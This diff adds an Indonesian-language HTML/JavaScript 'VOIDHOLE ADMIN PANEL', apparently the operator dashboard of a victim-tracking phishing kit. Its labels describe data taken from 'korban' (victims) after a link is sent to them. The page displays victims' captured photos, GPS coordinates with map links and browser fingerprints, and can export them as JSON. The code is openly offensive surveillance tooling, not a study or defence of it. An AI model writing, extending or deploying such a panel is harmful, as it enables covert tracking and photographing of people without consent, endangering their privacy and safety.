@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>💀 VOIDHOLE ADMIN PANEL 💀</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body{background:#0a0a0a;font-family:'Courier New',monospace;padding:20px;}
+        .header{background:linear-gradient(135deg,#1a0000,#0a0000);padding:20px;border-bottom:3px solid #ff0000;margin-bottom:20px;}
+        h1{color:#ff0000;text-align:center;}
+        .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:15px;margin-bottom:20px;}
+        .stat-card{background:#1a1a1a;padding:20px;border-radius:10px;text-align:center;border-left:4px solid #ff0000;}
+        .stat-number{font-size:36px;color:#ff0000;font-weight:bold;}
+        .refresh-btn{background:#ff0000;color:white;padding:10px 20px;border:none;border-radius:5px;cursor:pointer;margin-bottom:20px;}
+        .data-list{background:#1a1a1a;border-radius:10px;overflow:hidden;padding:10px;}
+        .data-item{background:#0a0a0a;padding:15px;margin:10px;border-radius:8px;border:1px solid #ff0000;}
+        .data-header{display:flex;justify-content:space-between;margin-bottom:10px;color:#ff6666;}
+        .data-type{color:#ffaa00;font-weight:bold;}
+        .data-content{color:#fff;word-break:break-all;font-size:12px;}
+        img{max-width:100%;border-radius:8px;margin-top:10px;}
+        .tab-buttons{display:flex;gap:10px;margin-bottom:20px;flex-wrap:wrap;}
+        .tab-btn{background:#333;color:white;padding:10px 20px;border:none;cursor:pointer;}
+        .tab-btn.active{background:#ff0000;}
+        .tab-content{display:none;}
+        .tab-content.active{display:block;}
+        .empty-data{text-align:center;padding:40px;color:#666;}
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>💀 VOIDHOLE ADMIN PANEL 💀</h1>
+        <p style="text-align:center;color:#ff6666;">Live Target Monitoring | Data dari korban</p>
+    </div>
+    
+    <div class="stats">
+        <div class="stat-card"><div class="stat-number" id="totalTargets">0</div><div>Total Data</div></div>
+        <div class="stat-card"><div class="stat-number" id="totalPhotos">0</div><div>Foto</div></div>
+        <div class="stat-card"><div class="stat-number" id="totalLocations">0</div><div>Lokasi</div></div>
+    </div>
+    
+    <div class="tab-buttons">
+        <button class="tab-btn active" onclick="switchTab('all')">📋 Semua Data</button>
+        <button class="tab-btn" onclick="switchTab('photo')">📸 Foto Target</button>
+        <button class="tab-btn" onclick="switchTab('location')">📍 Lokasi Target</button>
+        <button class="tab-btn" onclick="switchTab('fingerprint')">🖥️ Fingerprint</button>
+    </div>
+    
+    <button class="refresh-btn" onclick="loadData()">🔄 Refresh Data</button>
+    <button class="refresh-btn" onclick="exportData()" style="background:#333;margin-left:10px;">📥 Export JSON</button>
+    <button class="refresh-btn" onclick="clearData()" style="background:#8b0000;margin-left:10px;">🗑️ Hapus Semua</button>
+    
+    <div id="allTab" class="tab-content active"><div class="data-list" id="dataList"></div></div>
+    <div id="photoTab" class="tab-content"><div class="data-list" id="photoList"></div></div>
+    <div id="locationTab" class="tab-content"><div class="data-list" id="locationList"></div></div>
+    <div id="fingerprintTab" class="tab-content"><div class="data-list" id="fingerprintList"></div></div>
+    
+    <script>
+        let allData = [];
+        
+        function loadData() {
+            const stored = localStorage.getItem('voidhole_data');
+            if(stored && stored !== 'undefined' && stored !== 'null') {
+                try {
+                    allData = JSON.parse(stored);
+                } catch(e) {
+                    allData = [];
+                }
+            } else {
+                allData = [];
+            }
+            
+            document.getElementById('totalTargets').innerText = allData.length;
+            document.getElementById('totalPhotos').innerText = allData.filter(d => d && d.type === 'photo').length;
+            document.getElementById('totalLocations').innerText = allData.filter(d => d && d.type === 'location').length;
+            
+            renderList('dataList', allData);
+            renderList('photoList', allData.filter(d => d && d.type === 'photo'));
+            renderList('locationList', allData.filter(d => d && d.type === 'location'));
+            renderList('fingerprintList', allData.filter(d => d && d.type === 'fingerprint'));
+        }
+        
+        function renderList(elementId, data) {
+            const container = document.getElementById(elementId);
+            if(!container) return;
+            
+            if(!data || data.length === 0) {
+                container.innerHTML = '<div class="empty-data">📭 Belum ada data dari target. Kirim link dulu ke korban!</div>';
+                return;
+            }
+            
+            container.innerHTML = data.map((item, idx) => {
+                let content = '';
+                if(item.type === 'photo') {
+                    content = `<img src="${item.data}" alt="Foto Target" style="max-width:100%; border:2px solid red; border-radius:10px;">`;
+                } else if(item.type === 'location') {
+                    content = `
+                        <div>📍 Latitude: ${item.lat}</div>
+                        <div>📍 Longitude: ${item.lng}</div>
+                        <div>🎯 Akurasi: ${item.accuracy} meter</div>
+                        <a href="https://www.google.com/maps?q=${item.lat},${item.lng}" target="_blank" style="color:#ff0000; font-size:14px;">🌍 BUKA GOOGLE MAPS</a>
+                    `;
+                } else if(item.type === 'fingerprint') {
+                    content = `
+                        <div><strong>🖥️ User Agent:</strong><br>${item.userAgent}</div>
+                        <div><strong>📱 Screen:</strong> ${item.screenSize}</div>
+                        <div><strong>🌐 Language:</strong> ${item.language}</div>
+                        <div><strong>💻 Platform:</strong> ${item.platform}</div>
+                        <div><strong>⏰ Timezone:</strong> ${item.timezone}</div>
+                    `;
+                } else {
+                    content = `<pre style="font-size:10px; overflow:auto;">${JSON.stringify(item, null, 2)}</pre>`;
+                }
+                
+                return `
+                    <div class="data-item">
+                        <div class="data-header">
+                            <span class="data-type">📌 ${item.type ? item.type.toUpperCase() : 'UNKNOWN'}</span>
+                            <span>🕐 ${item.timestamp ? new Date(item.timestamp).toLocaleString() : 'No date'}</span>
+                        </div>
+                        <div class="data-content">${content}</div>
+                    </div>
+                `;
+            }).join('');
+        }
+        
+        function switchTab(tab) {
+            const btns = document.querySelectorAll('.tab-btn');
+            const contents = document.querySelectorAll('.tab-content');
+            btns.forEach(btn => btn.classList.remove('active'));
+            contents.forEach(content => content.classList.remove('active'));
+            if(event && event.target) event.target.classList.add('active');
+            else btns[0].classList.add('active');
+            document.getElementById(tab + 'Tab').classList.add('active');
+        }
+        
+        function exportData() {
+            const dataStr = JSON.stringify(allData, null, 2);
+            const blob = new Blob([dataStr], {type: 'application/json'});
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `voidhole_data_${new Date().toISOString()}.json`;
+            a.click();
+            URL.revokeObjectURL(url);
+        }
+        
+        function clearData() {
+            if(confirm('⚠️ Yakin hapus SEMUA data target? ⚠️')) {
+                localStorage.removeItem('voidhole_data');
+                loadData();
+                alert('✅ Semua data telah dihapus!');
+            }
+        }
+        
+        loadData();
+        setInterval(loadData, 3000);
+    </script>
+</body>
+  </html>
